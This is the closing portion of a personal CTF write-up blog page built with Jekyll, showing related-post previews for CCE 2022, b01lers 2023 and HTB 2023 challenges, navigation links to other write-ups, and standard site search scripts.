          <a href="/posts/CCE-2022/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1664078453"
  data-df="ll"
  
>
  Sep 25, 2022
</time>

              <h4 class="pt-0 my-2">CCE 2022 Write Up</h4>
              <div class="text-muted">
                <p>
                  





                  After a long time I did ctf again. Actually, a few days ago, , a member of zer0pt, asked me to do CCE together, but I refused. The reason was because of work.

But I was able to find 5 XSS from...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/b01lers/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1679264029"
  data-df="ll"
  
>
  Mar 20, 2023
</time>

              <h4 class="pt-0 my-2">b01lers CTF 2023 Write Up</h4>
              <div class="text-muted">
                <p>
                  





                  Summary

Cause I was lazy, I didnt do ctf for a long time. If i say cause I was busy, it looks fucking stupid. When Im solving, the time of ctf is only 5 hours, so i just decided to solve the w...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/HTBCTF2023/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1679609629"
  data-df="ll"
  
>
  Mar 24, 2023
</time>

              <h4 class="pt-0 my-2">HTB apocalypse CTF 2023 spybug Write Up</h4>
              <div class="text-muted">
                <p>
                  





                  spybug

require(&quot;dotenv&quot;).config();

const fs = require(&quot;fs&quot;);
const path = require(&quot;path&quot;);
const express = require(&quot;express&quot;);
const session = require(&quot;express-session&quot;);

const { createAdmin } =...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Sekai-CTF-2025/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Sekai 2025 Write Up</p>
    </a>
  

  
    <a
      href="/posts/TFC-CTF-2025/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>TFC CTF 2025 Write Up</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
style="background-color:#030014"
>

</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

